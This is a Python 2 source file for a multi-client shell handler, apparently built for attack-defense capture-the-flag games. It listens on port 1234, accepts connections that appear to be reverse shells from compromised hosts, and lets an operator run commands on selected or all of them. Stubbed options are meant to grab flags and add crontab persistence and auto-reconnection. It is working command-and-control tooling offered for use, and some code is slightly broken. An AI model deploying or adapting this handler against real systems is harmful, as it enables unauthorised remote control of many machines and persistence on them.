#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
from Queue import Queue
from threading import Thread, Lock, Condition
from time import sleep
from commander import Commander
from client import *
import re
import hashlib
import sys
sys.path.append('../')
from utils import log


def md5(data):
    return hashlib.md5(data).hexdigest()

class Server(object):
	def __init__(self, commander_listen_address):
		self.MAX_CONNECTION_NUMBER = 50
		self._clients_lock = Lock()
		self.clients = {}
		self.target_clients = {}
		self.executed_condition=Condition()
		self.commander_listen_address = commander_listen_address

	def _notifyExecuted(self):
		self.executed_condition.acquire()
		self.executed_condition.notifyAll()
		self.executed_condition.release()

	def waitExecute(self):
		self.executed_condition.acquire()
		self.executed_condition.wait()
		self.executed_condition.release()

	def setTargetClient(self, targets):
		if targets == "a":
			self.target_clients = self.clients
			return True
		else:
			tmp={}
			targets = re.split('[, ]', targets)
			for i in targets:
				for j in self.clients:
					if j.startswith(i):
						tmp[j]=self.clients[j]
			if len(tmp) > 0:
				self.target_clients=tmp
				return True
			else:
				log.error('target error!', __name__)
				return False

	def removeClient(self, client_hash = None, host = None):
		'''
			use this method after release lock
		'''
		result = None
		if not client_hash:
			if host:
				client_hash=md5(host)
			else:
				log.error('no args provide!',__name__)
				return result

		if client_hash in self.target_clients:
			self.target_clients.pop(client_hash)

		self._clients_lock.acquire()
		for cl_hash in self.clients.keys():
			if cl_hash.startswith(client_hash):
				client = self.clients[cl_hash]
				if not client.closeConn():
					log.warn('(%s:%s)close client conn failed!'%(client.host,client.port), __name__)
				result = cl_hash, self.clients.pop(cl_hash)
		self._clients_lock.release()
		if not result:
			log.error('client not found!', __name__)
		return result

	def threadingRunCommand(self, cl_hash, client , command, timeout, resultQueue):
		result = '*' * 6 + '(%s)%s'%(cl_hash, client) + '*' * 6 +'\n'
		result += client.runCommand(command,timeout=timeout)+"\n"
		resultQueue.put(result)

	def runCommand(self, command, timeout=3):
		result = ''
		resultQueue = Queue()
		threadList=[]
		for cl_hash, client in self.target_clients.iteritems():
			t=Thread(target=self.threadingRunCommand,args=(cl_hash,client,command,timeout,resultQueue))
			threadList.append(t)
			t.start()
		for t in threadList:
			t.join(timeout=timeout+1)
		while not resultQueue.empty():
			result += resultQueue.get()
		return result

	def stop(self):
		for i in self.clients.keys():
			self.removeClient(i)


class ListenServer(Server):
	def __init__(self, listen_address, commander_listen_address):
		super(ListenServer,self).__init__(commander_listen_address)
		self.listen_address = listen_address
		self.listen_host=listen_address[0]
		self.listen_port=listen_address[1]
		self.binded_condition=Condition()
		
	def _waitBind(self):
		self.binded_condition.acquire()
		self.binded_condition.wait()
		self.binded_condition.release()

	def _notifyBinded(self):
		self.binded_condition.acquire()
		self.binded_condition.notifyAll()
		self.binded_condition.release()

	def notifyExecuted(self):
		self.executed_condition.acquire()
		self.executed_condition.notifyAll()
		self.executed_condition.release()

	def waitExecute(self):
		self.executed_condition.acquire()
		self.executed_condition.wait()
		self.executed_condition.release()

	def _listen(self):
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.bind(self.listen_address)
		self.socket.listen(self.MAX_CONNECTION_NUMBER)
		self._notifyBinded()
		self.listen_address=self.socket.getsockname()
		log.info('client server is listening on %s:%s'%self.listen_address, __name__)
		while True:
			client_conn, client_address = self.socket.accept()
			client_hash = md5(client_address[0])
			self._clients_lock.acquire()
			if client_hash in self.clients:
				log.info('same host reconnect,remove old client..', __name__)
				self._clients_lock.release()
				self.removeClient(client_hash)
				self._clients_lock.acquire()
			new_clinet = Client(client_address, client_conn)
			self.clients[client_hash] = new_clinet
			self._clients_lock.release()
			if len(self.target_clients) == 0:
				self.target_clients[client_hash] = new_clinet
			log.info('new client on %s:%s connected'%client_address, __name__)
			
	def info(self, query):
		query = query.split(' ', 1) 
		name = query[0]
		args = query[1:] if len(query) > 1 else []

		if name.startswith('help'):
			info=\
"""
Commands : 
    [l] : set log level	(CRITICAL = 150,ERROR = 140,WARNING = 130,INFO = 120,DEBUG = 110,NOTSET = 100)
    [h] : show this help
    [sh] : show informations,'t' for target,'a' for all
    [t] : set command target, usage: 
    	"t [clients_hash],([clients_hash])" ('a' for all, example : t a, t 1,5 ) 
    [d] : delete client, usage : "d x.x.x.x"
    [r] : send command to target clients, usage: "r(timeout) [command]"(example :"r10 whoami")
    [i] : interactive with target clients
    [adc] : add crontab, usage: "adc [content]"
    [gf] : get flags
    [ac] : add auto connection cron
    [q|e] : exit   
"""

		elif name.startswith('a'):
			if len(args) == 0:
				args=['de']
			if args[0].startswith('br'):
				info = '*' * 12 +'\n'
				info += 'client server: ' + '%s:%s \n'%(self.listen_address)
				info += 'command server: ' + '%s:%s \n'%(self.listen_address)
				info += 'clients:%s ,...(%s hosts)\n'%(
					self.clients.values()[0] if len(self.clients) else '(Null)',
					len(self.clients)
					)
				info += '*' * 12
			elif args[0].startswith('de'):
				info = '*' * 12 +'\n'
				info += 'client server: ' + '%s:%s \n'%(self.listen_address)
				info += 'command server: ' + '%s:%s \n'%(self.listen_address)
				info += 'clients:\n'
				self._clients_lock.acquire()
				if len(self.clients):
					for cl_hash,client in self.clients.iteritems():
						info += '(%s) : %s \n'%(cl_hash, client)
				else:
					info += '(Null)\n'
				self._clients_lock.release()
				info += '*' * 12

		elif name.startswith('t'):
			if len(self.target_clients) == 0:
				info = '(Null)'
			elif len(self.target_clients) == 1:
				info = self.target_clients.values()[0]
			else:
				if len(args) == 0:
					args = ['de']
				if args[0].startswith('br'):
					info = + '%s ,...(%s hosts)'%(self.target_clients.values()[0], len(self.target_clients))
				elif args[0].startswith('de'):
					info = ',\n'.join(self.target_clients.values())
		return info

	def start(self):
		self.listener = Thread(target = self._listen)
		self.listener.setDaemon(True)
		self.listener.start()
		self._waitBind()
		self.commander = Commander(self,self.commander_listen_address)
		while True:
			raw = self.commander.getCommand()
			tmp = raw.split(' ', 1)
			command = tmp[0]
			args = tmp[1] if len(tmp)>1 else ''
			if command.startswith('e') or command.startswith('q'):
				break
			elif command == '':
				result = ""
			elif command.startswith('l'):
				levels={"CRITICAL" : 150,
						"ERROR" : 140,
						"WARNING" : 130,
						"INFO" : 120,
						"DEBUG" : 110,
						"NOTSET" : 100,
						150 : "CRITICAL",
						140 : "ERROR",
						130 : "WARNING",
						120 : "INFO",
						110 : "DEBUG",
						100 : "NOTSET"}
				if args.isdigit():
					level=int(args)
				elif args in levels:
					level = levels[args]
				else:
					level = None
				if level:
					log.Logger.setLevel(level)
					result="set log level to %s"%levels[level]
				else:
					result="wrong level!"
			elif command.startswith('h'):
				result=self.info('help')
			elif command.startswith('sh'):
				result=self.info(args)
			elif command.startswith('t'):
				result=self.setTargetClient(args)
			elif command.startswith('d'):
				tmp = self.removeClient(args)
				result='removed: %s'%tmp
			elif command.startswith('r'):
				timeout=int(command[1:]) if command[1:].isdigit() else 4
				if args == "":
					self.commander.sendResult("(command mode,exit with 'qq')")
					self.commander.command_prompt = "$"
					while True:
						raw = self.commander.getCommand()
						if raw == "qq":
							self.commander.command_prompt = ">"
							result = "(exit command mode)"
							break
						if raw.strip() == "":
							result=""
						else:
							result=self.runCommand(raw,timeout)
						self.commander.sendResult(result)
				else:
					result=self.runCommand(args,timeout)
			elif command.startswith('adc'):
				pass #TODO
			elif command.startswith('gf'):
				pass #TODO
			elif command.startswith('ac'):
				pass #TODO
			else:
				log.error('invaild command!',__name__)
				result=self.info('help')
			self.commander.sendResult(result)

class ConnectServer:
	"""TODO  active connect shell server"""
	def __init__(self, arg):
		super(connect_server, self).__init__()
		self.arg = arg
		
if __name__ == "__main__":
	a = ListenServer(('0.0.0.0', 1234), ('127.0.0.1', 0))
	a.start()
	a.stop()